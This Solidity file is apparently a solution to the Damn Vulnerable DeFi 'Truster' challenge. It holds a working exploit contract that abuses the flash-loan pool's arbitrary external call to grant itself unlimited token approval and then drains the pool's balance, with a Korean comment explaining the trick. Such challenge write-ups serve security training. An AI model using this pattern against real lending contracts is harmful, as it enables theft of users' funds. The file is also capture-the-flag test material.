// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    
    DamnValuableToken token;
    TrusterLenderPool pool;

    constructor(TrusterLenderPool _pool, address recovery) {
        pool = _pool;
        token = pool.token();

        /*
         * 돌파구: 플래시론 실행 시 토큰 풀 측에서 사용자가 직접 지정한 콜백 컨트랙트와 calldata를 호출해주는 서비스를 제공하는데,
         * 컨트랙트=token, calldata=approve(공격 컨트랙트 주소, MAX)로 지정하여 플래시론을 실행하면 플래시론 종료 직후 자산을 탈탈 털어버릴 수 있음.
         */ 
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
        pool.flashLoan(0, address(pool), address(token), data);
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}